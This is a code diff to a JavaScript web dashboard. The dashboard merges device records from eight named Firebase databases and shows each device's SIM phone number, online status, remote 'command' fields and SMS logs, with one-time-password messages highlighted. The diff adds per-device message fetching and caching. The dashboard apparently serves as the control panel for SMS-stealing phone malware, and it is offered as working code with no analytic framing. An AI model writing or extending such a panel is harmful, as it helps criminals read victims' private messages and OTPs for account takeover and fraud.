@@ -634,14 +634,14 @@
     // ===== FIREBASE CONFIG =====
     // All database sources
     const SOURCES = [
-        { id: 'primary', url: 'https://sssssmmmmsw-default-rtdb.asia-southeast1.firebasedatabase.app', path: 'users' },
-        { id: 'neha', url: 'https://neha-2e45d-default-rtdb.firebaseio.com/', path: 'clients' },
-        { id: 'rajkumar', url: 'https://rajkumar-a67fb-default-rtdb.firebaseio.com/', path: 'clients' },
-        { id: 'romini', url: 'https://romini-57831-default-rtdb.firebaseio.com/', path: 'clients' },
-        { id: 'strboii', url: 'https://strboii-default-rtdb.firebaseio.com/', path: 'clients' },
-        { id: 'kalui', url: 'https://kalui-a8e2b-default-rtdb.firebaseio.com/', path: 'clients' },
-        { id: 'babayou', url: 'https://babayou-ca160-default-rtdb.firebaseio.com/', path: 'clients' },
-        { id: 'annu', url: 'https://annu-f0207-default-rtdb.firebaseio.com/', path: 'clients' }
+        { id: 'primary', url: 'https://sssssmmmmsw-default-rtdb.asia-southeast1.firebasedatabase.app', path: 'users', messagesPath: 'users' },
+        { id: 'annu', url: 'https://annu-f0207-default-rtdb.firebaseio.com/', path: 'clients', messagesPath: 'messages' },
+        { id: 'neha', url: 'https://neha-2e45d-default-rtdb.firebaseio.com/', path: 'clients', messagesPath: 'messages' },
+        { id: 'rajkumar', url: 'https://rajkumar-a67fb-default-rtdb.firebaseio.com/', path: 'clients', messagesPath: 'messages' },
+        { id: 'romini', url: 'https://romini-57831-default-rtdb.firebaseio.com/', path: 'clients', messagesPath: 'messages' },
+        { id: 'strboii', url: 'https://strboii-default-rtdb.firebaseio.com/', path: 'clients', messagesPath: 'messages' },
+        { id: 'kalui', url: 'https://kalui-a8e2b-default-rtdb.firebaseio.com/', path: 'clients', messagesPath: 'messages' },
+        { id: 'babayou', url: 'https://babayou-ca160-default-rtdb.firebaseio.com/', path: 'clients', messagesPath: 'messages' }
     ];
 
     // Firebase app instances cache
@@ -653,6 +653,7 @@
     let currentFilter = 'all';
     let searchQuery = '';
     let isInitialLoad = true;
+    let messageCache = {};
 
     // ===== TOAST =====
     function showToast(msg) {
@@ -692,19 +693,15 @@
 
     function isOnline(userData) {
         if (!userData) return false;
-        // Check status field
         if (userData.status === true || userData.status === 'true') return true;
         if (userData.status === false || userData.status === 'false') return false;
-        // Check ping.wake
         if (userData.ping && userData.ping.wake === true) return true;
-        // Check isOnline (from primary source)
         if (userData.isOnline === true) return true;
         return false;
     }
 
     function getPhoneNumber(userData) {
         if (!userData) return null;
-        // Primary source: simInfo
         if (userData.simInfo) {
             for (const key in userData.simInfo) {
                 const sim = userData.simInfo[key];
@@ -712,12 +709,10 @@
                 if (sim.phoneNumber) return sim.phoneNumber;
             }
         }
-        // Other sources
         if (userData.mobNo) return userData.mobNo;
         if (userData.mobile) return userData.mobile;
         if (userData.phone) return userData.phone;
         if (userData.phoneNumber) return userData.phoneNumber;
-        // sims array
         if (userData.sims && Array.isArray(userData.sims)) {
             for (const sim of userData.sims) {
                 if (sim.phoneNumber) return sim.phoneNumber;
@@ -742,11 +737,14 @@
 
     function getSmsCount(userData) {
         if (!userData) return 0;
-        // Primary source: sms_logs
         if (userData.sms_logs) {
             return Object.keys(userData.sms_logs).length;
         }
-        // Other sources might have messages in different places
+        // Check if we have messages cached for this device
+        const compositeId = userData._compositeId;
+        if (compositeId && messageCache[compositeId]) {
+            return Object.keys(messageCache[compositeId]).length;
+        }
         let count = 0;
         if (userData.message) count++;
         if (userData.sms) count++;
@@ -756,14 +754,25 @@
 
     function getLatestSms(userData) {
         if (!userData) return null;
-        // Primary source: sms_logs
+        // Check cached messages first
+        const compositeId = userData._compositeId;
+        if (compositeId && messageCache[compositeId]) {
+            const entries = Object.entries(messageCache[compositeId]);
+            if (entries.length === 0) return null;
+            entries.sort((a, b) => {
+                const tsA = a[1].timestamp || a[1].id || 0;
+                const tsB = b[1].timestamp || b[1].id || 0;
+                return tsB - tsA;
+            });
+            const latest = entries[0][1];
+            return { message: latest.message || latest.text || '', sender: latest.sender || 'Unknown' };
+        }
         if (userData.sms_logs) {
             const entries = Object.entries(userData.sms_logs);
             if (entries.length === 0) return null;
             entries.sort((a, b) => (b[1].timestamp || 0) - (a[1].timestamp || 0));
             return entries[0][1];
         }
-        // Other sources: check for message fields
         if (userData.message) return { message: userData.message, sender: 'command' };
         if (userData.sms) return { message: userData.sms, sender: 'command' };
         if (userData.text) return { message: userData.text, sender: 'command' };
@@ -773,13 +782,33 @@
     function getAllSms(userData) {
         if (!userData) return [];
         let messages = [];
-        // Primary source: sms_logs
+        const compositeId = userData._compositeId;
+        
+        // Check cached messages first (from /messages endpoint)
+        if (compositeId && messageCache[compositeId]) {
+            const entries = Object.entries(messageCache[compositeId]);
+            entries.sort((a, b) => {
+                const tsA = a[1].timestamp || a[1].id || 0;
+                const tsB = b[1].timestamp || b[1].id || 0;
+                return tsB - tsA;
+            });
+            messages = entries.map(([key, val]) => ({
+                id: key,
+                sender: val.sender || val.from || 'Unknown',
+                message: val.message || val.text || val.body || '',
+                timestamp: val.timestamp || val.id || Date.now(),
+                type: val.type || 'incoming'
+            }));
+            return messages;
+        }
+        
+        // Fallback to sms_logs
         if (userData.sms_logs) {
             const entries = Object.entries(userData.sms_logs);
             entries.sort((a, b) => (b[1].timestamp || 0) - (a[1].timestamp || 0));
             messages = entries.map(e => ({ id: e[0], ...e[1] }));
         }
-        // Other sources: add command messages
+        // Add command messages
         if (userData.message) {
             messages.push({ id: 'cmd1', sender: 'command', message: userData.message, timestamp: Date.now() });
         }
@@ -789,7 +818,6 @@
         if (userData.text) {
             messages.push({ id: 'cmd3', sender: 'command', message: userData.text, timestamp: Date.now() });
         }
-        // Sort by timestamp descending
         messages.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
         return messages;
     }
@@ -826,16 +854,33 @@
     function fetchSourceData(source) {
         return new Promise((resolve) => {
             const app = initFirebaseApp(source);
-            if (!app) return resolve({ source, data: null });
+            if (!app) return resolve({ source, data: null, messages: null });
 
             const db = firebase.database(app);
+            
+            // Fetch clients data
             const ref = db.ref(source.path);
-
             ref.once('value', (snapshot) => {
                 resolve({ source, data: snapshot.val() });
             }, (err) => {
                 console.error('Error fetching', source.id, err);
                 resolve({ source, data: null });
+            });
+        });
+    }
+
+    function fetchMessagesForDevice(source, deviceId) {
+        return new Promise((resolve) => {
+            const app = initFirebaseApp(source);
+            if (!app) return resolve(null);
+            
+            const db = firebase.database(app);
+            const ref = db.ref(`${source.messagesPath}/${deviceId}`);
+            ref.once('value', (snapshot) => {
+                resolve(snapshot.val());
+            }, (err) => {
+                console.error('Error fetching messages for', deviceId, err);
+                resolve(null);
             });
         });
     }
@@ -854,19 +899,39 @@
 
             // Merge all data
             const mergedData = {};
+            const messagePromises = [];
+
             for (const result of results) {
                 if (!result.data) continue;
                 const sourceId = result.source.id;
                 const data = result.data;
                 
-                // Add source prefix to device IDs to avoid conflicts
                 for (const deviceId in data) {
                     const compositeId = `${sourceId}::${deviceId}`;
                     mergedData[compositeId] = {
                         ...data[deviceId],
                         _source: sourceId,
-                        _deviceId: deviceId
+                        _deviceId: deviceId,
+                        _compositeId: compositeId
                     };
+                    
+                    // Queue message fetch for this device
+                    const source = SOURCES.find(s => s.id === sourceId);
+                    if (source) {
+                        messagePromises.push(
+                            fetchMessagesForDevice(source, deviceId)
+                                .then(messages => ({ compositeId, messages }))
+                                .catch(() => ({ compositeId, messages: null }))
+                        );
+                    }
+                }
+            }
+
+            // Fetch all messages in parallel
+            const messageResults = await Promise.all(messagePromises);
+            for (const result of messageResults) {
+                if (result.messages) {
+                    messageCache[result.compositeId] = result.messages;
                 }
             }
 
@@ -952,7 +1017,6 @@
                 `;
             }
 
-            // Show source tag
             const sourceTag = user._source || 'unknown';
             const sourceDisplay = sourceTag.substring(0, 4);
 
@@ -1079,9 +1143,15 @@
                 }
             }
 
+            // Check if it's a missed call notification
+            const isMissedCall = sms.message && sms.message.includes('missed call');
+            const typeLabel = sms.type === 'outgoing' ? '📤 Outgoing' : 
+                            isMissedCall ? '📞 Missed Call' : 
+                            sms.type === 'incoming' ? '📨 Incoming' : '📨';
+
             div.innerHTML = `
                 <div class="msg-header">
-                    <span class="msg-sender">📨 ${escapeHtml(sender)}</span>
+                    <span class="msg-sender">${typeLabel} ${escapeHtml(sender)}</span>
                     <span class="msg-time">${parseTimestamp(sms.timestamp)}</span>
                 </div>
                 <div class="msg-body ${isOTP ? 'highlight' : ''}">${bodyHtml}</div>
